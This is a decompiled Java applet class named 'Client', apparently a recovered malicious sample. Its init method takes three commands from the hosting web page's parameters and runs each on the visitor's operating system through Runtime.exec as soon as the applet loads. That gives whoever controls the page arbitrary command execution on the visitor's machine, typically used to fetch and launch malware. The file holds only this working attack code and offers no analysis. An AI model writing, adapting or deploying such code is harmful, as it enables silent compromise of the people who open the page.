import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Client extends Applet
{
    @Override
    public void init() {
        final String first = this.getParameter("first");
        try {
            final Process f = Runtime.getRuntime().exec(first);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        final String second = this.getParameter("second");
        try {
            final Process s = Runtime.getRuntime().exec(second);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        final String third = this.getParameter("third");
        try {
            final Process t = Runtime.getRuntime().exec(third);
        }
        catch (IOException e3) {
            e3.printStackTrace();
        }
    }
}
